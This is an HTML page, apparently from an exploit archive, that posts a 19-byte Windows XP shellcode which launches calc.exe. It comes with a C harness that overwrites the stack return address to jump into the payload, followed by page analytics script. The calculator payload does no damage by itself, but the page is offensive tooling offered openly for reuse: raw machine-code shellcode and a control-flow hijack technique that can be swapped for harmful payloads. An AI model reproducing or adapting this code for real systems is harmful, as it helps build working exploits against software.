<html><head><title>Windows - Shellcode Collection - (calc) 19 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Author: SkuLL-HacKeR
Big Thx To :  my brothers : Pr0F.SELLiM - ThE X-HaCkEr -  Jiko  - My friends in Morocco
H0ME  : Geeksec.com  &amp; No-exploiT
Email : My@Hotmail.iT &amp; Wizard-skh@hotmail.com
 
 
// Win32 Shellcode Collection (calc) 19 bytes
// Shellcode Exec Calc.exe
// Tested on XP SP2 FR
#include &quot;stdio.h&quot;
unsigned char shellcode[] = &quot;\xeB\x02\xBA\xC7\x93&quot;
                            &quot;\xBF\x77\xFF\xD2\xCC&quot;
                            &quot;\xE8\xF3\xFF\xFF\xFF&quot;
                            &quot;\x63\x61\x6C\x63&quot;;
int main ()
{
int *ret;
ret=(int *)&amp;ret+2;
printf(&quot;Shellcode Length is : %d\n&quot;,strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
